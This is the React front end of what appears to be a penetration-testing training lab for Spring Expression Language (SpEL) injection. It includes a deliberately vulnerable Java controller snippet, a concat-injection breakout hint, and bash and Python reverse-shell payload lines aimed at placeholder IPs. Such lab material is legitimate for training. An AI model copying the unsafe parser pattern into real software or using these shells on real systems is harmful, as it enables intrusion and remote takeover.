import React, { useState } from 'react';
import { View } from './types';
import {
  SPEL_CONTROLLER_CODE,
  POM_XML_CODE,
  DOCKER_COMPOSE_CODE,
  SETUP_SCRIPTS_CODE,
  DOCKERFILE_CODE,
  README_CODE,
  INIT_SQL_CODE,
  BUILD_SCRIPT
} from './constants';
import { CodeViewer } from './components/CodeViewer';
import { TerminalWindow } from './components/TerminalWindow';

const App: React.FC = () => {
  const [currentView, setCurrentView] = useState<View>(View.DASHBOARD);
  
  // Simulation State
  const [directInput, setDirectInput] = useState('1+1');
  const [directResult, setDirectResult] = useState<string | null>(null);
  
  const [rceCommand, setRceCommand] = useState('');
  const [rceOutput, setRceOutput] = useState<string[]>(['Welcome to SpEL RCE Console', 'Try: whoami, id, ls /']);
  const [isRceProcessing, setIsRceProcessing] = useState(false);

  const navItems = [
    { id: View.DASHBOARD, label: 'Dashboard', icon: '⚡' },
    { id: View.BUILD_GUIDE, label: 'Deploy / Build OVA', icon: '💿' },
    { type: 'divider' },
    { id: View.LAB_DIRECT, label: 'Lab: Direct Injection', icon: '💉' },
    { id: View.LAB_CONCAT, label: 'Lab: Concat Injection', icon: '🔗' },
    { id: View.LAB_RCE, label: 'Lab: RCE & Shell', icon: '💀' },
    { type: 'divider' },
    { id: View.SOURCE_JAVA, label: 'Backend: Java Controller', icon: '☕' },
    { id: View.SOURCE_DOCKER, label: 'Config: Docker & MySQL', icon: '🐳' },
    { id: View.SOURCE_SCRIPTS, label: 'Scripts: PrivEsc', icon: '📜' },
    { id: View.README, label: 'README & Usage', icon: '📘' },
  ];

  const simulateDirectSpEL = () => {
    // Very basic simulation for educational purposes
    try {
      if (directInput === '1+1') setDirectResult('2');
      else if (directInput.includes('T(java.lang.Runtime)')) setDirectResult('java.lang.ProcessImpl@6f7902');
      else if (directInput.includes("'hello'")) setDirectResult('hello');
      else if (directInput.match(/^\d+[\+\-\*\/]\d+$/)) {
        // eslint-disable-next-line no-eval
        setDirectResult(eval(directInput).toString());
      }
      else setDirectResult(`[Simulated Server] Processed: ${directInput}`);
    } catch (e) {
      setDirectResult('Error parsing SpEL');
    }
  };

  const simulateRCE = () => {
    setIsRceProcessing(true);
    const newOutput = [...rceOutput, `└─$ ${rceCommand}`];
    setRceOutput(newOutput);

    setTimeout(() => {
      let result = '';
      const cmd = rceCommand.trim();
      
      if (cmd === 'whoami') result = 'root';
      else if (cmd === 'id') result = 'uid=0(root) gid=0(root) groups=0(root)';
      else if (cmd === 'ls') result = 'app.jar\ninit.sql\npom.xml\nsrc';
      else if (cmd === 'ls /tmp') result = 'custom_find\nlogs.txt';
      else if (cmd.includes('nc') || cmd.includes('bash -i')) result = '[*] Reverse shell connection initiated to remote host...';
      else if (cmd === '') result = '';
      else result = `/bin/sh: ${cmd.split(' ')[0]}: command not found`;

      if (result) {
        setRceOutput([...newOutput, result]);
      } else {
        setRceOutput([...newOutput]);
      }
      setRceCommand('');
      setIsRceProcessing(false);
    }, 400);
  };

  const renderContent = () => {
    switch (currentView) {
      case View.DASHBOARD:
        return (
          <div className="space-y-6">
            <h1 className="text-3xl font-bold text-kali-accent">SpEL Injection Vulnerability Lab</h1>
            <p className="text-gray-400">
              This application generates a complete <strong>Real-World Vulnerable Environment</strong> based on Spring Boot. 
              While this interface acts as a simulator/generator, the underlying code is designed to be deployed on a real Linux server for penetration testing practice.
            </p>
            
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mt-6">
              <div className="bg-kali-panel p-6 rounded border border-gray-700 hover:border-kali-blue transition cursor-pointer" onClick={() => setCurrentView(View.BUILD_GUIDE)}>
                <h3 className="text-xl font-bold mb-2 text-green-400">🚀 Build Real Lab</h3>
                <p className="text-sm text-gray-400">Get the auto-installer script to deploy this lab on a VM or Docker host.</p>
              </div>
              <div className="bg-kali-panel p-6 rounded border border-gray-700 hover:border-kali-blue transition">
                <h3 className="text-xl font-bold mb-2">P1: RCE & Persistence</h3>
                <p className="text-sm text-gray-400">Contains <code>Runtime.exec()</code> vulnerabilities allowing full system compromise.</p>
              </div>
              <div className="bg-kali-panel p-6 rounded border border-gray-700 hover:border-kali-blue transition">
                <h3 className="text-xl font-bold mb-2">P2: Privilege Escalation</h3>
                <p className="text-sm text-gray-400">Includes SUID binaries and writable Cron jobs for root escalation practice.</p>
              </div>
            </div>

            <div className="bg-blue-900/20 border border-blue-500/30 p-4 rounded mt-8">
              <h4 className="font-bold text-blue-400">Getting Started</h4>
              <ul className="list-disc list-inside text-sm text-gray-300 mt-2 space-y-1">
                <li>Go to <strong>Deploy / Build OVA</strong> to get the installation script.</li>
                <li>Run the script on a fresh Ubuntu or Kali VM.</li>
                <li>Access the vulnerable app at <code>http://your-vm-ip:80/spel/vuln/direct</code>.</li>
              </ul>
            </div>
          </div>
        );

      case View.BUILD_GUIDE:
        return (
           <div className="space-y-6">
             <h2 className="text-2xl font-bold text-green-400">VMware Deployment & OVA Guide</h2>
             <p className="text-gray-300">
               Follow this workflow to create a distributable <code>.ova</code> file (like DC-7) or a live attack target.
             </p>

             <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
                <div className="bg-gray-800 p-3 rounded text-center border-b-4 border-gray-600">
                  <div className="text-2xl mb-1">1️⃣</div>
                  <div className="font-bold">Create Base VM</div>
                  <div className="text-xs text-gray-400">Install Ubuntu Server</div>
                </div>
                <div className="bg-gray-800 p-3 rounded text-center border-b-4 border-kali-blue">
                  <div className="text-2xl mb-1">2️⃣</div>
                  <div className="font-bold">Run Script</div>
                  <div className="text-xs text-gray-400">Installs Vulnerability</div>
                </div>
                <div className="bg-gray-800 p-3 rounded text-center border-b-4 border-yellow-500">
                  <div className="text-2xl mb-1">3️⃣</div>
                  <div className="font-bold">Export OVA</div>
                  <div className="text-xs text-gray-400">Pack for Distribution</div>
                </div>
                <div className="bg-gray-800 p-3 rounded text-center border-b-4 border-red-500">
                  <div className="text-2xl mb-1">4️⃣</div>
                  <div className="font-bold">Attack</div>
                  <div className="text-xs text-gray-400">From Kali Linux</div>
                </div>
             </div>

             <div className="space-y-4">
               <div className="bg-kali-panel p-4 rounded border border-l-4 border-l-gray-600 border-gray-700">
                 <h3 className="font-bold text-white">Step 1: Create Base VM</h3>
                 <p className="text-sm text-gray-400 mt-1">In VMware/VirtualBox, install a minimal <strong>Ubuntu Server 20.04/22.04</strong>. Configure the network as "Bridged" or "NAT" so it has internet access for the installation.</p>
               </div>
               
               <div className="bg-kali-panel p-4 rounded border border-l-4 border-l-kali-blue border-gray-700">
                 <h3 className="font-bold text-white">Step 2: Install Vulnerability</h3>
                 <p className="text-sm text-gray-400 mt-1">Log into your new VM. Copy the script below, save it as <code>install_lab.sh</code>, and run it. This sets up Docker, MySQL, and the Java App.</p>
                 <CodeViewer filename="install_lab.sh" code={BUILD_SCRIPT} language="bash" />
                 <p className="text-xs text-gray-500 mt-2">Command: <code>chmod +x install_lab.sh && sudo ./install_lab.sh</code></p>
               </div>

               <div className="bg-kali-panel p-4 rounded border border-l-4 border-l-yellow-500 border-gray-700">
                 <h3 className="font-bold text-white">Step 3: Export as OVA (Optional)</h3>
                 <p className="text-sm text-gray-400 mt-1">
                    <strong>Do not attack yet!</strong> If you want to share this lab or save a clean state:
                 </p>
                 <ol className="list-decimal list-inside text-sm text-gray-400 mt-2 ml-2">
                   <li>Shutdown the VM (<code>sudo poweroff</code>).</li>
                   <li>In VMware: File &gt; Export &gt; Export to OVF/OVA.</li>
                   <li>Save as <code>SpEL-Injection-Lab.ova</code>.</li>
                 </ol>
               </div>

                <div className="bg-kali-panel p-4 rounded border border-l-4 border-l-red-500 border-gray-700">
                 <h3 className="font-bold text-white">Step 4: Attack</h3>
                 <p className="text-sm text-gray-400 mt-1">
                   Import the OVA (or start your VM). From your <strong>Kali Linux</strong> machine, access the target IP.
                 </p>
                 <p className="text-sm text-green-400 font-mono mt-2">curl http://TARGET_IP:80/spel/vuln/direct?expression=1+1</p>
               </div>
             </div>
           </div>
        );

      case View.LAB_DIRECT:
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-kali-text">Lab 1: Direct SpEL Injection</h2>
            <div className="bg-kali-panel p-6 rounded border border-gray-700">
              <div className="mb-4 bg-yellow-900/30 border border-yellow-600/50 p-3 rounded text-sm text-yellow-200">
                ⚠️ This is a simulation. To exploit the real vulnerability, deploy the lab using the <strong>Deploy</strong> tab.
              </div>
              <label className="block text-sm font-medium mb-2 text-gray-400">Expression Input (Simulated)</label>
              <div className="flex gap-2">
                <input 
                  type="text" 
                  value={directInput}
                  onChange={(e) => setDirectInput(e.target.value)}
                  className="flex-1 bg-black border border-gray-600 rounded px-4 py-2 text-white focus:border-kali-blue outline-none"
                />
                <button 
                  onClick={simulateDirectSpEL}
                  className="bg-kali-blue hover:bg-blue-600 text-white px-6 py-2 rounded font-bold"
                >
                  Execute
                </button>
              </div>
              <div className="mt-4 p-4 bg-black border border-gray-800 rounded font-mono text-green-500 min-h-[60px]">
                {directResult || <span className="text-gray-600">// Output will appear here</span>}
              </div>
            </div>
            
            <div className="mt-8">
              <h3 className="text-lg font-bold text-gray-300 mb-2">Vulnerable Code Snippet</h3>
              <CodeViewer filename="SpelController.java (Snippet)" code={`@GetMapping("/direct")
public String direct(@RequestParam String expression) {
    ExpressionParser parser = new SpelExpressionParser();
    // VULNERABILITY: User input passed directly to parser
    Expression exp = parser.parseExpression(expression); 
    return exp.getValue(String.class);
}`} />
            </div>
          </div>
        );

      case View.LAB_CONCAT:
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-kali-text">Lab 2: Concat Injection</h2>
            <div className="bg-kali-panel p-6 rounded border border-gray-700">
              <p className="mb-4 text-gray-400">The server wraps your input: <code>"Hello, ('" + input + "')!"</code></p>
              <p className="mb-4 text-sm text-gray-500">Try to break out using: <code>') + ... + ('</code></p>
              <div className="flex gap-2">
                <input 
                  type="text" 
                  placeholder="Enter name..."
                  className="flex-1 bg-black border border-gray-600 rounded px-4 py-2 text-white focus:border-kali-blue outline-none"
                />
                <button 
                  className="bg-kali-blue hover:bg-blue-600 text-white px-6 py-2 rounded font-bold"
                  onClick={() => alert("This is a simulation. Check the Source Code tab for the actual implementation.")}
                >
                  Submit
                </button>
              </div>
            </div>
          </div>
        );

      case View.LAB_RCE:
        return (
          <div className="space-y-6">
            <h2 className="text-2xl font-bold text-red-500">Lab 3: Remote Code Execution (RCE)</h2>
            <p className="text-gray-400">Simulate sending commands to the <code>/spel/vuln/rce</code> endpoint.</p>
            
            <TerminalWindow 
              output={rceOutput}
              command={rceCommand}
              onCommandChange={setRceCommand}
              onExecute={simulateRCE}
              isProcessing={isRceProcessing}
              title="Remote Shell Simulation"
            />

            <div className="mt-6">
               <h3 className="text-lg font-bold text-gray-300 mb-2">Reverse Shell Payloads</h3>
               <div className="grid gap-4">
                 <div className="bg-kali-panel p-4 rounded border border-gray-700">
                   <h4 className="font-bold text-kali-accent mb-2">Bash Reverse Shell</h4>
                   <code className="text-xs break-all text-green-400">bash -i &gt;& /dev/tcp/10.10.10.10/4444 0&gt;&1</code>
                 </div>
                 <div className="bg-kali-panel p-4 rounded border border-gray-700">
                   <h4 className="font-bold text-kali-accent mb-2">Python Reverse Shell</h4>
                   <code className="text-xs break-all text-green-400">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code>
                 </div>
               </div>
            </div>
          </div>
        );

      case View.SOURCE_JAVA:
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold">Backend Source Code</h2>
            <p className="text-gray-400">The core Spring Boot Controller implementing the vulnerabilities.</p>
            <CodeViewer filename="src/main/java/com/example/spel/controller/SpelController.java" code={SPEL_CONTROLLER_CODE} />
            <h3 className="text-xl font-bold mt-8">Maven Configuration</h3>
            <CodeViewer filename="pom.xml" code={POM_XML_CODE} language="xml" />
          </div>
        );
      
      case View.SOURCE_DOCKER:
        return (
          <div className="space-y-4">
             <h2 className="text-2xl font-bold">Infrastructure Configuration</h2>
             <CodeViewer filename="docker-compose.yml" code={DOCKER_COMPOSE_CODE} language="yaml" />
             <CodeViewer filename="Dockerfile" code={DOCKERFILE_CODE} language="dockerfile" />
             <CodeViewer filename="init.sql" code={INIT_SQL_CODE} language="sql" />
          </div>
        );

      case View.SOURCE_SCRIPTS:
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold">Privilege Escalation Scripts</h2>
            <p className="text-gray-400">Scripts used to configure the vulnerable SUID and Cron jobs inside the container.</p>
            <CodeViewer filename="setup_scripts.sh" code={SETUP_SCRIPTS_CODE} language="bash" />
          </div>
        );

      case View.README:
        return (
          <div className="space-y-4">
             <h2 className="text-2xl font-bold">Documentation</h2>
             <CodeViewer filename="README.md" code={README_CODE} language="markdown" />
          </div>
        );

      default:
        return <div>Select a view</div>;
    }
  };

  return (
    <div className="min-h-screen bg-kali-bg text-gray-200 flex font-sans">
      {/* Sidebar */}
      <div className="w-64 bg-kali-panel border-r border-gray-800 flex flex-col fixed h-full">
        <div className="p-6 border-b border-gray-800">
          <h1 className="text-xl font-bold tracking-wider text-white">
            <span className="text-kali-blue">SPEL</span> LAB
          </h1>
          <p className="text-xs text-gray-500 mt-1">Vuln Environment Gen</p>
        </div>
        <nav className="flex-1 overflow-y-auto py-4">
          {navItems.map((item, idx) => 
            item.type === 'divider' ? (
              <div key={idx} className="h-px bg-gray-800 my-2 mx-4" />
            ) : (
              <button
                key={idx}
                onClick={() => item.id && setCurrentView(item.id as View)}
                className={`w-full text-left px-6 py-3 text-sm font-medium transition flex items-center gap-3
                  ${currentView === item.id 
                    ? 'bg-kali-blue/10 text-kali-blue border-r-2 border-kali-blue' 
                    : 'text-gray-400 hover:bg-white/5 hover:text-white'
                  }`}
              >
                <span>{item.icon}</span>
                {item.label}
              </button>
            )
          )}
        </nav>
        <div className="p-4 border-t border-gray-800 text-xs text-gray-600 text-center">
          Generated for Kali Linux
        </div>
      </div>

      {/* Main Content */}
      <div className="ml-64 flex-1 p-8 overflow-y-auto">
        <div className="max-w-5xl mx-auto">
          {renderContent()}
        </div>
      </div>
    </div>
  );
};

export default App;